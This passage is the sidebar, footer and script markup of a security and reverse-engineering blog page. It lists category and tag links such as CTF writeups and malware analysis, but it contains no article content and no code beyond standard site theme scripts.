href="/categories/Brain-Logs/"><span class="level-start"><span class="level-item">Brain Logs</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF-Writeups/"><span class="level-start"><span class="level-item">CTF Writeups</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Exploitation/"><span class="level-start"><span class="level-item">Exploitation</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/IOT/"><span class="level-start"><span class="level-item">IOT</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Machine-Learning/"><span class="level-start"><span class="level-item">Machine Learning</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Malware-Analysis/"><span class="level-start"><span class="level-item">Malware Analysis</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/NLP/"><span class="level-start"><span class="level-item">NLP</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Reverse-Engineering/"><span class="level-start"><span class="level-item">Reverse Engineering</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ACS712/"><span class="tag">ACS712</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Arduino/"><span class="tag">Arduino</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Chat-Bots/"><span class="tag">Chat Bots</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Classification/"><span class="tag">Classification</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Data-Wrangling/"><span class="tag">Data Wrangling</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dev/"><span class="tag">Dev</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dropper/"><span class="tag">Dropper</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ESP8266/"><span class="tag">ESP8266</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Editor/"><span class="tag">Editor</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Emacs/"><span class="tag">Emacs</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Exploitation/"><span class="tag">Exploitation</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/GandCrab/"><span class="tag">GandCrab</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Grey-Energy/"><span class="tag">Grey Energy</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Heap-Exploitation/"><span class="tag">Heap Exploitation</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Kernel-Debugging/"><span class="tag">Kernel Debugging</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag is-grey-lightest">15</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux-Malware/"><span class="tag">Linux Malware</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Malware-Analysis/"><span class="tag">Malware Analysis</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ROP/"><span class="tag">ROP</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Regression/"><span class="tag">Regression</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Reverse-Engineering/"><span class="tag">Reverse Engineering</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Visualization/"><span class="tag">Visualization</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WarGames/"><span class="tag">WarGames</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Malware/"><span class="tag">Windows Malware</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Reversing/"><span class="tag">Windows Reversing</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/glibc/"><span class="tag">glibc</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/javascript-obfuscation/"><span class="tag">javascript obfuscation</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable/"><span class="tag">pwnable</span><span class="tag is-grey-lightest">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-kr/"><span class="tag">pwnable-kr</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-tw/"><span class="tag">pwnable-tw</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/radare2/"><span class="tag">radare2</span><span class="tag is-grey-lightest">4</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/logo-header.png" alt="D3xt3r&#039;s Laboratory" height="28"></a><p class="size-small"><span>&copy; 2020 D3xt3r</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Subscribe" href="https://mailchi.mp/d744c1f04904/taintedbits"><i class="fa fa-envelope"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("en")</script><script>var IcarusThemeSettings={site:{url:"https://www.taintedbits.com",external_link:{enable:!0,exclude:[]}},article:{highlight:{clipboard:!0,fold:"unfolded"}}}</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now</a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load",function(){outdatedBrowser({bgColor:"#f25648",color:"#ffffff",lowerThan:"object-fit"})})</script><a id="back-to-top" title="Back to Top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener("DOMContentLoaded",function(){loadInsight({contentUrl:"/content.json"},{hint:"Type something...",untitled:"(Untitled)",posts:"Posts",pages:"Pages",categories:"Categories",tags:"Tags"})})</script></body></html>